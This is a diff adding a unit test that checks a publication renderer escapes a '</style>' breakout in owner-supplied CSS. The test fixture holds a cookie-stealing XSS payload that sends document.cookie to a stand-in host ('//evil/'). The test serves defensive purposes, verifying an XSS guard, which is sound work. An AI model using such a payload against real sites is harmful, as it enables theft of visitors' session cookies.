@@ -168,6 +168,22 @@ describe("resolvePublication", () => {
     expect(result.body).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
   });
 
+  it("neutralizes a </style> breakout in owner css (XSS guard)", async () => {
+    const store = getStore();
+    await createPattern(store, "spicy2", [{ name: "title", type: "text", required: true }]);
+    await createEntry(store, "spicy2", { title: "hi" });
+    await createPublication(store, {
+      path: "evil", source_pattern: "spicy2", format: "html",
+      css: "</style><script>document.location='//evil/?'+document.cookie</script><style>",
+    });
+    const result = JSON.parse(await store.resolvePublication("evil"));
+    // the </style> / </script> closing tags are neutralized to <\/style> / <\/script>,
+    // so the payload can't break out of the <style> element (it stays inert CSS text).
+    expect(result.body).not.toContain("</style><script>"); // no breakout sequence
+    expect(result.body).not.toContain("</script>");         // closing script tag escaped
+    expect(result.body).toContain("<\\/style>");            // neutralized form present
+  });
+
   it("renders RSS with items and RFC-822 dates", async () => {
     const store = getStore();
     await notesWithEntries(store);
